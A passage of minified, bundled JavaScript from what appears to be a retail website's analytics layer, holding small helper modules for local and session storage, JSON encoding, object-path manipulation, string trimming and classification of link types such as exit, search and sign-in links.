n.default=e,t&&t.set(e,n),n}exports.urlHelpers=urlHelpers},{"./activityMap/index.js":151,"./asCookie/index.js":158,"./asCookieJson/index.js":161,"./beaconHelpers/index.js":167,"./cookie/index.js":175,"./cookieJson/index.js":178,"./deepClone/index.js":181,"./dispatchEventAsync/index.js":182,"./eventHelpers/index.js":184,"./getOmniture/index.js":187,"./getRandomInt/index.js":189,"./jsonEncoder/index.js":193,"./localStorage/index.js":195,"./localStorageJson/index.js":199,"./objectHelpers/index.js":201,"./objectPath/index.js":209,"./pipe/index.js":213,"./sessionStorage/index.js":216,"./sessionStorageJson/index.js":220,"./stringHelpers/index.js":222,"./urlHelpers/index.js":233}],191:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function decode(data){if(!data)return null;try{return JSON.parse(data)}catch(e){return null}}},{}],192:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function encode(data){if(!data)return null;try{return JSON.stringify(data)}catch(e){return null}}},{}],193:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"decode",{enumerable:!0,get:function get(){return _decode.default}}),Object.defineProperty(exports,"encode",{enumerable:!0,get:function get(){return _encode.default}});var _decode=_interopRequireDefault(require("./decode.js")),_encode=_interopRequireDefault(require("./encode.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}},{"./decode.js":191,"./encode.js":192}],194:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function get(key){try{return window.localStorage.getItem(key)}catch(e){return""}}},{}],195:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"get",{enumerable:!0,get:function get(){return _get.default}}),Object.defineProperty(exports,"remove",{enumerable:!0,get:function get(){return _remove.default}}),Object.defineProperty(exports,"set",{enumerable:!0,get:function get(){return _set.default}});var _get=_interopRequireDefault(require("./get.js")),_set=_interopRequireDefault(require("./set.js")),_remove=_interopRequireDefault(require("./remove.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}},{"./get.js":194,"./remove.js":196,"./set.js":197}],196:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function remove(key){try{return window.localStorage.removeItem(key),!0}catch(e){return!1}}},{}],197:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function set(key,value){try{return window.localStorage.setItem(key,value||""),!0}catch(e){return!1}}},{}],198:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("../pipe/index.js")),_index2=require("../localStorage/index.js"),_index3=require("../jsonEncoder/index.js");var get=(0,_index.default)(_index2.get,_index3.decode);exports.default=get},{"../jsonEncoder/index.js":193,"../localStorage/index.js":195,"../pipe/index.js":213}],199:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"get",{enumerable:!0,get:function get(){return _get.default}}),Object.defineProperty(exports,"remove",{enumerable:!0,get:function get(){return _index.remove}}),Object.defineProperty(exports,"set",{enumerable:!0,get:function get(){return _set.default}});var _index=require("../localStorage/index.js"),_get=_interopRequireDefault(require("./get.js")),_set=_interopRequireDefault(require("./set.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}},{"../localStorage/index.js":195,"./get.js":198,"./set.js":200}],200:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=require("../localStorage/index.js"),_index2=require("../jsonEncoder/index.js");exports.default=function set(key,value){return(0,_index.set)(key,(0,_index2.encode)(value))}},{"../jsonEncoder/index.js":193,"../localStorage/index.js":195}],201:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"isNotEmpty",{enumerable:!0,get:function get(){return _isNotEmpty.default}}),Object.defineProperty(exports,"isObject",{enumerable:!0,get:function get(){return _isObject.default}}),Object.defineProperty(exports,"isValidObject",{enumerable:!0,get:function get(){return _isValidObject.default}});var _isObject=_interopRequireDefault(require("./isObject.js")),_isNotEmpty=_interopRequireDefault(require("./isNotEmpty.js")),_isValidObject=_interopRequireDefault(require("./isValidObject.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}},{"./isNotEmpty.js":202,"./isObject.js":203,"./isValidObject.js":204}],202:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _isObject=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./isObject.js"));exports.default=function isNotEmpty(obj){return!(!(0,_isObject.default)(obj)||!Object.keys(obj).length)}},{"./isObject.js":203}],203:[function(require,module,exports){"use strict";function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function isObject(obj){return!(!obj||"object"!==_typeof(obj)||Array.isArray(obj))}},{}],204:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _isObject=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./isObject.js"));exports.default=function isValidObject(obj,mandatoryProps){return(0,_isObject.default)(obj)&&Array.isArray(mandatoryProps)&&mandatoryProps.every((function(prop){return obj[prop]}))}},{"./isObject.js":203}],205:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default={separator:"."}},{}],206:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=require("../stringHelpers/index.js"),_config=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./config.js"));function _toConsumableArray(arr){return function _arrayWithoutHoles(arr){if(Array.isArray(arr))return _arrayLikeToArray(arr)}(arr)||function _iterableToArray(iter){if("undefined"!=typeof Symbol&&null!=iter[Symbol.iterator]||null!=iter["@@iterator"])return Array.from(iter)}(arr)||function _unsupportedIterableToArray(o,minLen){if(!o)return;if("string"==typeof o)return _arrayLikeToArray(o,minLen);var n=Object.prototype.toString.call(o).slice(8,-1);"Object"===n&&o.constructor&&(n=o.constructor.name);if("Map"===n||"Set"===n)return Array.from(o);if("Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))return _arrayLikeToArray(o,minLen)}(arr)||function _nonIterableSpread(){throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function _arrayLikeToArray(arr,len){(null==len||len>arr.length)&&(len=arr.length);for(var i=0,arr2=new Array(len);i<len;i++)arr2[i]=arr[i];return arr2}exports.default=function formatPath(){for(var _len=arguments.length,paths=new Array(_len),_key=0;_key<_len;_key++)paths[_key]=arguments[_key];return paths.map((function(path){return Array.isArray(path)?formatPath.apply(void 0,_toConsumableArray(path)):(0,_index.toStr)(path).split(_config.default.separator)})).reduce((function(acc,pathArray){return acc.concat(pathArray)}),[])}},{"../stringHelpers/index.js":222,"./config.js":205}],207:[function(require,module,exports){"use strict";function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function get(obj,path){return path&&path.length?path.reduce((function(acc,key){return acc&&"object"===_typeof(acc)?acc[key]:null}),obj):obj}},{}],208:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _get=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./get.js"));exports.default=function getFactory(path){return function(obj){return(0,_get.default)(obj,path)}}},{"./get.js":207}],209:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"formatPath",{enumerable:!0,get:function get(){return _formatPath.default}}),Object.defineProperty(exports,"get",{enumerable:!0,get:function get(){return _get.default}}),Object.defineProperty(exports,"getFactory",{enumerable:!0,get:function get(){return _getFactory.default}}),Object.defineProperty(exports,"remove",{enumerable:!0,get:function get(){return _remove.default}}),Object.defineProperty(exports,"set",{enumerable:!0,get:function get(){return _set.default}}),Object.defineProperty(exports,"setFactory",{enumerable:!0,get:function get(){return _setFactory.default}});var _formatPath=_interopRequireDefault(require("./formatPath.js")),_get=_interopRequireDefault(require("./get.js")),_getFactory=_interopRequireDefault(require("./getFactory.js")),_set=_interopRequireDefault(require("./set.js")),_setFactory=_interopRequireDefault(require("./setFactory.js")),_remove=_interopRequireDefault(require("./remove.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}},{"./formatPath.js":206,"./get.js":207,"./getFactory.js":208,"./remove.js":210,"./set.js":211,"./setFactory.js":212}],210:[function(require,module,exports){"use strict";function ownKeys(e,r){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);r&&(o=o.filter((function(r){return Object.getOwnPropertyDescriptor(e,r).enumerable}))),t.push.apply(t,o)}return t}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}function _toConsumableArray(arr){return function _arrayWithoutHoles(arr){if(Array.isArray(arr))return _arrayLikeToArray(arr)}(arr)||function _iterableToArray(iter){if("undefined"!=typeof Symbol&&null!=iter[Symbol.iterator]||null!=iter["@@iterator"])return Array.from(iter)}(arr)||function _unsupportedIterableToArray(o,minLen){if(!o)return;if("string"==typeof o)return _arrayLikeToArray(o,minLen);var n=Object.prototype.toString.call(o).slice(8,-1);"Object"===n&&o.constructor&&(n=o.constructor.name);if("Map"===n||"Set"===n)return Array.from(o);if("Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))return _arrayLikeToArray(o,minLen)}(arr)||function _nonIterableSpread(){throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function _arrayLikeToArray(arr,len){(null==len||len>arr.length)&&(len=arr.length);for(var i=0,arr2=new Array(len);i<len;i++)arr2[i]=arr[i];return arr2}function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var removeReversedPath=function removeReversedPath(obj,path){var key=path.pop(),result=Array.isArray(obj)?_toConsumableArray(obj):function _objectSpread(e){for(var r=1;r<arguments.length;r++){var t=null!=arguments[r]?arguments[r]:{};r%2?ownKeys(Object(t),!0).forEach((function(r){_defineProperty(e,r,t[r])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):ownKeys(Object(t)).forEach((function(r){Object.defineProperty(e,r,Object.getOwnPropertyDescriptor(t,r))}))}return e}({},obj);return path.length?("object"===_typeof(result[key])&&(result[key]=removeReversedPath(result[key],path)),result):(Array.isArray(result)?result.splice(Number(key)||result.length,1):delete result[key],result)};exports.default=function remove(obj,path){return path&&path.length&&"object"===_typeof(obj)?removeReversedPath(obj,_toConsumableArray(path).reverse()):obj}},{}],211:[function(require,module,exports){"use strict";function ownKeys(e,r){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);r&&(o=o.filter((function(r){return Object.getOwnPropertyDescriptor(e,r).enumerable}))),t.push.apply(t,o)}return t}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function _toConsumableArray(arr){return function _arrayWithoutHoles(arr){if(Array.isArray(arr))return _arrayLikeToArray(arr)}(arr)||function _iterableToArray(iter){if("undefined"!=typeof Symbol&&null!=iter[Symbol.iterator]||null!=iter["@@iterator"])return Array.from(iter)}(arr)||function _unsupportedIterableToArray(o,minLen){if(!o)return;if("string"==typeof o)return _arrayLikeToArray(o,minLen);var n=Object.prototype.toString.call(o).slice(8,-1);"Object"===n&&o.constructor&&(n=o.constructor.name);if("Map"===n||"Set"===n)return Array.from(o);if("Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))return _arrayLikeToArray(o,minLen)}(arr)||function _nonIterableSpread(){throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function _arrayLikeToArray(arr,len){(null==len||len>arr.length)&&(len=arr.length);for(var i=0,arr2=new Array(len);i<len;i++)arr2[i]=arr[i];return arr2}Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var setReversedPath=function setReversedPath(obj,path,value){if(!path.length)return value;if("object"===_typeof(obj)){var key=path.pop(),result=Array.isArray(obj)?_toConsumableArray(obj):function _objectSpread(e){for(var r=1;r<arguments.length;r++){var t=null!=arguments[r]?arguments[r]:{};r%2?ownKeys(Object(t),!0).forEach((function(r){_defineProperty(e,r,t[r])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):ownKeys(Object(t)).forEach((function(r){Object.defineProperty(e,r,Object.getOwnPropertyDescriptor(t,r))}))}return e}({},obj);return result[key]=setReversedPath(result[key],path,value),result}return setReversedPath({},path,value)};exports.default=function set(obj,path,value){return path&&path.length?setReversedPath(obj,_toConsumableArray(path).reverse(),value):obj}},{}],212:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _set=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./set.js"));exports.default=function setFactory(path){return function(obj,value){return(0,_set.default)(obj,path,value)}}},{"./set.js":211}],213:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"default",{enumerable:!0,get:function get(){return _pipe.default}});var _pipe=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./pipe.js"))},{"./pipe.js":214}],214:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function pipe(){for(var _len=arguments.length,fns=new Array(_len),_key=0;_key<_len;_key++)fns[_key]=arguments[_key];return function(x){return fns.reduce((function(v,f){return f(v)}),x)}}},{}],215:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function get(key){try{return window.sessionStorage.getItem(key)}catch(e){return""}}},{}],216:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"get",{enumerable:!0,get:function get(){return _get.default}}),Object.defineProperty(exports,"remove",{enumerable:!0,get:function get(){return _remove.default}}),Object.defineProperty(exports,"set",{enumerable:!0,get:function get(){return _set.default}});var _get=_interopRequireDefault(require("./get.js")),_set=_interopRequireDefault(require("./set.js")),_remove=_interopRequireDefault(require("./remove.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}},{"./get.js":215,"./remove.js":217,"./set.js":218}],217:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function remove(key){try{return window.sessionStorage.removeItem(key),!0}catch(e){return!1}}},{}],218:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function set(key,value){try{return window.sessionStorage.setItem(key,value||""),!0}catch(e){return!1}}},{}],219:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("../pipe/index.js")),_index2=require("../sessionStorage/index.js"),_index3=require("../jsonEncoder/index.js");var get=(0,_index.default)(_index2.get,_index3.decode);exports.default=get},{"../jsonEncoder/index.js":193,"../pipe/index.js":213,"../sessionStorage/index.js":216}],220:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"get",{enumerable:!0,get:function get(){return _get.default}}),Object.defineProperty(exports,"remove",{enumerable:!0,get:function get(){return _index.remove}}),Object.defineProperty(exports,"set",{enumerable:!0,get:function get(){return _set.default}});var _index=require("../sessionStorage/index.js"),_get=_interopRequireDefault(require("./get.js")),_set=_interopRequireDefault(require("./set.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}},{"../sessionStorage/index.js":216,"./get.js":219,"./set.js":221}],221:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=require("../sessionStorage/index.js"),_index2=require("../jsonEncoder/index.js");exports.default=function set(key,value){return(0,_index.set)(key,(0,_index2.encode)(value))}},{"../jsonEncoder/index.js":193,"../sessionStorage/index.js":216}],222:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"sliceTrim",{enumerable:!0,get:function get(){return _sliceTrim.sliceTrim}}),Object.defineProperty(exports,"sliceTrimFactory",{enumerable:!0,get:function get(){return _sliceTrimFactory.sliceTrimFactory}}),Object.defineProperty(exports,"toStr",{enumerable:!0,get:function get(){return _toStr.toStr}}),Object.defineProperty(exports,"toStrTrim",{enumerable:!0,get:function get(){return _toStrTrim.toStrTrim}}),Object.defineProperty(exports,"trimAllNonPrintable",{enumerable:!0,get:function get(){return _trimAllNonPrintable.trimAllNonPrintable}}),Object.defineProperty(exports,"trimExtraWhiteSpaces",{enumerable:!0,get:function get(){return _trimExtraWhiteSpaces.trimExtraWhiteSpaces}});var _toStrTrim=require("./toStrTrim.js"),_toStr=require("./toStr.js"),_trimExtraWhiteSpaces=require("./trimExtraWhiteSpaces.js"),_trimAllNonPrintable=require("./trimAllNonPrintable.js"),_sliceTrim=require("./sliceTrim.js"),_sliceTrimFactory=require("./sliceTrimFactory.js")},{"./sliceTrim.js":223,"./sliceTrimFactory.js":224,"./toStr.js":225,"./toStrTrim.js":226,"./trimAllNonPrintable.js":227,"./trimExtraWhiteSpaces.js":228}],223:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.sliceTrim=void 0;var _toStr=require("./toStr.js");exports.sliceTrim=function sliceTrim(str,maxLength){return(0,_toStr.toStr)(str).slice(0,maxLength).trim()}},{"./toStr.js":225}],224:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.sliceTrimFactory=void 0;var _sliceTrim=require("./sliceTrim.js");exports.sliceTrimFactory=function sliceTrimFactory(maxlength){return function(str){return(0,_sliceTrim.sliceTrim)(str,maxlength)}}},{"./sliceTrim.js":223}],225:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.toStr=void 0;exports.toStr=function toStr(){var val=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"";return val||!1===val||0===val?String(val):""}},{}],226:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.toStrTrim=void 0;var _toStr=require("./toStr.js");exports.toStrTrim=function toStrTrim(input){return(0,_toStr.toStr)(input).trim()}},{"./toStr.js":225}],227:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.trimAllNonPrintable=void 0;var _toStr=require("./toStr.js");exports.trimAllNonPrintable=function trimAllNonPrintable(str){return(0,_toStr.toStr)(str).replace(/[^ -~]+/g,"")}},{"./toStr.js":225}],228:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.trimExtraWhiteSpaces=void 0;var _toStr=require("./toStr.js");exports.trimExtraWhiteSpaces=function trimExtraWhiteSpaces(str){return(0,_toStr.toStr)(str).replace(/\s+/g," ")}},{"./toStr.js":225}],229:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function classListContains(element){for(var _len=arguments.length,classNames=new Array(_len>1?_len-1:0),_key=1;_key<_len;_key++)classNames[_key-1]=arguments[_key];return element instanceof HTMLElement&&classNames.some((function(className){return element.classList.contains(className)}))}},{}],230:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function getOrigin(element){return element?"origin"in element?element.origin:"".concat(element.protocol,"//").concat(element.hostname):""}},{}],231:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.getQueryParam=void 0;exports.getQueryParam=function getQueryParam(param){return window.URL?new URL(window.location).searchParams.get(param):null}},{}],232:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.hasPropertyValue=void 0;exports.hasPropertyValue=function hasPropertyValue(){var _ref=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},element=_ref.element,property=_ref.property,_ref$values=_ref.values;return!!element&&(void 0===_ref$values?[]:_ref$values).includes(element[property])}},{}],233:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"classListContains",{enumerable:!0,get:function get(){return _classListContains.default}}),Object.defineProperty(exports,"getOrigin",{enumerable:!0,get:function get(){return _getOrigin.default}}),Object.defineProperty(exports,"getQueryParam",{enumerable:!0,get:function get(){return _getQueryParam.getQueryParam}}),Object.defineProperty(exports,"isAccessoriesSERPLink",{enumerable:!0,get:function get(){return _isAccessoriesSERPLink.isAccessoriesSERPLink}}),Object.defineProperty(exports,"isCrossOriginLink",{enumerable:!0,get:function get(){return _isCrossOriginLink.default}}),Object.defineProperty(exports,"isExitLink",{enumerable:!0,get:function get(){return _isExitLink.default}}),Object.defineProperty(exports,"isExternalLink",{enumerable:!0,get:function get(){return _isExternalLink.default}}),Object.defineProperty(exports,"isGlobalNavLink",{enumerable:!0,get:function get(){return _isGlobalNavLink.default}}),Object.defineProperty(exports,"isImmediateLink",{enumerable:!0,get:function get(){return _isImmediateLink.default}}),Object.defineProperty(exports,"isMarcomUrl",{enumerable:!0,get:function get(){return _isMarcomUrl.default}}),Object.defineProperty(exports,"isSearchLink",{enumerable:!0,get:function get(){return _isSearchLink.default}}),Object.defineProperty(exports,"isServiceSERPLink",{enumerable:!0,get:function get(){return _isServiceSERPLink.isServiceSERPLink}}),Object.defineProperty(exports,"isSignInLink",{enumerable:!0,get:function get(){return _isSignInLink.default}}),Object.defineProperty(exports,"isSignOutLink",{enumerable:!0,get:function get(){return _isSignOutLink.default}}),Object.defineProperty(exports,"isStoreSERPLink",{enumerable:!0,get:function get(){return _isStoreSERPLink.isStoreSERPLink}}),Object.defineProperty(exports,"isTargetingOtherWindow",{enumerable:!0,get:function get(){return _isTargetingOtherWindow.default}}),Object.defineProperty(exports,"isValidLink",{enumerable:!0,get:function get(){return _isValidLink.default}}),Object.defineProperty(exports,"redirectsToSignInLink",{enumerable:!0,get:function get(){return _redirectsToSignInLink.default}}),Object.defineProperty(exports,"resolvesToSearchPage",{enumerable:!0,get:function get(){return _resolvesToSearchPage.default}}),Object.defineProperty(exports,"sanitizeUrl",{enumerable:!0,get:function get(){return _sanitizeUrl.sanitizeUrl}});var _classListContains=_interopRequireDefault(require("./classListContains.js")),_getOrigin=_interopRequireDefault(require("./getOrigin.js")),_getQueryParam=require("./getQueryParam.js"),_isCrossOriginLink=_interopRequireDefault(require("./isCrossOriginLink.js")),_isExitLink=_interopRequireDefault(require("./isExitLink.js")),_isExternalLink=_interopRequireDefault(require("./isExternalLink.js")),_isGlobalNavLink=_interopRequireDefault(require("./isGlobalNavLink.js")),_isImmediateLink=_interopRequireDefault(require("./isImmediateLink.js")),_isMarcomUrl=_interopRequireDefault(require("./isMarcomUrl.js")),_isSearchLink=_interopRequireDefault(require("./isSearchLink.js")),_isSignInLink=_interopRequireDefault(require("./isSignInLink.js")),_isSignOutLink=_interopRequireDefault(require("./isSignOutLink.js")),_isTargetingOtherWindow=_interopRequireDefault(require("./isTargetingOtherWindow.js")),_isValidLink=_interopRequireDefault(require("./isValidLink.js")),_redirectsToSignInLink=_interopRequireDefault(require("./redirectsToSignInLink.js")),_resolvesToSearchPage=_interopRequireDefault(require("./resolvesToSearchPage.js")),_isAccessoriesSERPLink=require("./isAccessoriesSERPLink.js"),_isStoreSERPLink=require("./isStoreSERPLink.js"),_isServiceSERPLink=require("./isServiceSERPLink.js"),_sanitizeUrl=require("./sanitizeUrl.js");function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}},{"./classListContains.js":229,"./getOrigin.js":230,"./getQueryParam.js":231,"./isAccessoriesSERPLink.js":234,"./isCrossOriginLink.js":235,"./isExitLink.js":236,"./isExternalLink.js":237,"./isGlobalNavLink.js":238,"./isImmediateLink.js":239,"./isMarcomUrl.js":240,"./isSearchLink.js":241,"./isServiceSERPLink.js":242,"./isSignInLink.js":243,"./isSignOutLink.js":244,"./isStoreSERPLink.js":245,"./isTargetingOtherWindow.js":246,"./isValidLink.js":247,"./redirectsToSignInLink.js":248,"./resolvesToSearchPage.js":249,"./sanitizeUrl.js":250}],234:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.isAccessoriesSERPLink=void 0;var _classListContains=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./classListContains.js"));exports.isAccessoriesSERPLink=function isAccessoriesSERPLink(element){return(0,_classListContains.default)(element,"as-producttile-tilelink","pd-onebox-block")}},{"./classListContains.js":229}],235:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _getOrigin=_interopRequireDefault(require("./getOrigin.js")),_isValidLink=_interopRequireDefault(require("./isValidLink.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}exports.default=function isCrossOriginLink(element){return(0,_isValidLink.default)(element)&&(0,_getOrigin.default)(element)!==(0,_getOrigin.default)(window.document.location)}},{"./getOrigin.js":230,"./isValidLink.js":247}],236:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _isValidLink=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./isValidLink.js"));exports.default=function isExitLink(element){return(0,_isValidLink.default)(element)&&void 0!==element.dataset.analyticsExitLink}},{"./isValidLink.js":247}],237:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=_interopRequireDefault(require("../getOmniture/index.js")),_isValidLink=_interopRequireDefault(require("./isValidLink.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}exports.default=function isExternalLink(element){return!(!(0,_isValidLink.default)(element)||!element.hostname)&&(((0,_index.default)()||{}).linkInternalFilters||"").split(",").every((function(domain){return element.hostname.indexOf(domain.trim())<0}))}},{"../getOmniture/index.js":187,"./isValidLink.js":247}],238:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _classListContains=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./classListContains.js"));exports.default=function isGlobalNavLink(element){return(0,_classListContains.default)(element,"ac-gn-link")}},{"./classListContains.js":229}],239:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _classListContains=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./classListContains.js"));exports.default=function isImmediateLink(element){return(0,_classListContains.default)(element,"as-analytics-sendimmediately")}},{"./classListContains.js":229}],240:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function isMarcomUrl(url){return!!url&&(url.indexOf("shop")<0&&url.indexOf("search")<0)}},{}],241:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _classListContains=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./classListContains.js"));exports.default=function isSearchLink(element){return(0,_classListContains.default)(element,"ac-gn-searchresults-link")}},{"./classListContains.js":229}],242:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.isServiceSERPLink=void 0;var _isValidLink=function _interopRequireDefault(obj){return 